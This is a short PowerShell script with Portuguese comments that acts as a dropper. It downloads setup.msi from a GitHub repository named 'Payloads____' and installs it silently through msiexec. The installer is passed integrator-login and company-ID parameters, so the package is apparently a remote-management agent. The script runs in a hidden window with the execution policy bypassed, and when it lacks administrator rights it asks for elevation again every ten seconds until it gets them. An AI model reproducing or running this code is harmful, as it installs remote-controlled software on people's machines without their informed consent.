# Define o código que será executado com privilégios administrativos
$command = @"
    `$downloadURL = 'https://github.com/T1Cr4azy/Payloads____/raw/main/setup.msi'
    `$downloadPath = `$env:USERPROFILE + '\Desktop\setup.msi'

    Invoke-WebRequest -Uri `$downloadURL -OutFile `$downloadPath

    if (Test-Path `$downloadPath) {
        `$arguments = '/i `"$downloadPath`" /qn IntegratorLogin=admin@unisonagency.net CompanyId=1'
        Start-Process -FilePath msiexec.exe -ArgumentList `$arguments -NoNewWindow -Wait
    } else {
        Write-Host 'Falha ao baixar o arquivo MSI.'
    }
"@

# Verifica se o script está sendo executado com privilégios administrativos
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$command`" -Wait"
}

# Se o script não estiver sendo executado com privilégios administrativos, solicita privilégios administrativos
if (-Not $isAdmin) {
    # Executa o loop até que o arquivo MSI seja baixado
    while (-Not (Test-Path -Path "$env:USERPROFILE\Desktop\setup.msi")) {
        # Solicita privilégios administrativos
        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$command`" -Wait"
        Start-Sleep 10
    }
}
